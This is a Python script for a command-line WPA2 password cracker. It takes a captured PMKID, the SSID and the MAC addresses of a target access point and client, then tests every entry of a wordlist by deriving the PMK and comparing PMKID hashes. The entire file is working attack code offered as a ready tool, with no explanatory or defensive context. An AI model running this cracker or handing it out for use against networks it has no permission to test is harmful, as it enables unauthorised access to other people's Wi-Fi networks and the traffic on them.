import hmac
from hashlib import pbkdf2_hmac, sha1
import argparse
import threading
import concurrent.futures
import time

def calculate_pmkid(pmk, ap_mac, sta_mac):
    pmkid = hmac.new(pmk, b"PMK Name" + ap_mac + sta_mac, sha1).digest()[:16]
    return pmkid


def find_pw(pw, ssid, ap_mac, sta_mac, captured_pmkid, stop_event):
    if stop_event.is_set():
        return
    password = pw.strip()
    pmk = pbkdf2_hmac("sha1", password.encode("utf-8"), ssid, 4096, 32)
    pmkid = calculate_pmkid(pmk, ap_mac, sta_mac)
    if pmkid == captured_pmkid:
        print(f"\n[+] CRACKED WPA2 KEY: {password}")
        stop_event.set()


def main():
    parser = argparse.ArgumentParser(prog='pmkidcrack', 
                                    description='A PMKID 1 message WPA2 cracker',
                                    usage='%(prog)s -s SSID -ap BSSID -c CLIENTMAC -p PMKID -w WORDLIST -t THREADS')

    workers = 10
    parser.add_argument("-s", "--ssid", help="SSID of Target AP", required=True)
    parser.add_argument("-ap", '--accesspoint', help="BSSID (Mac Addr) of AP", required=True)
    parser.add_argument("-c", "--clientmac", help="Client Mac Addr, the initiator", required=True)
    parser.add_argument("-p", "--pmkid", help="Message 1 PMKID in HEX", required=True)
    parser.add_argument("-w", "--wordlist", help="Dictionary wordlist to use", required=True)
    parser.add_argument("-t", "--threads", help="Number of threads (Default=10)", required=True)
    parser.add_argument("-a", "--automatic", help="Specify PCAP file to use", required=False) # In development (Not Implemented)
    args = parser.parse_args()

    ssid = (args.ssid).encode()
    bssid = args.accesspoint
    client = args.clientmac
    pmkid = args.pmkid
    wordlist = args.wordlist
    workers = int(args.threads)

    print(f"[*] Initializing PMKID Cracker")
    print(f"[*] SSID: {args.ssid}")
    print(f"[*] BSSID: {args.accesspoint}")
    print(f"[*] Client Mac: {args.clientmac}")
    print(f"[*] PMKID: {args.pmkid}")
    print(f"[*] Using Wordlist: {args.wordlist}")
    print(f"[*] Using Threads: {args.threads}")
    
    bssid = bytes.fromhex(bssid.replace(":", ""))
    client = bytes.fromhex(client.replace(":", ""))
    pmkid = bytes.fromhex(pmkid)
    
    stop_event = threading.Event()

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor, open(wordlist, "r", encoding='ISO-8859-1') as file:
        pw_list = file.readlines()
        print(f"[*] {len(pw_list)} passwords loaded from {wordlist}")
        start = time.perf_counter()

        threads = []
        for pw in pw_list:
            if stop_event.is_set():
                break
            t = threading.Thread(target=find_pw, args=(pw, ssid, bssid, client, pmkid, stop_event), daemon=True)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

    finish = time.perf_counter()
    print(f'[+] Finished in {round(finish-start, 2)} second(s)')
if __name__ == '__main__':
    main()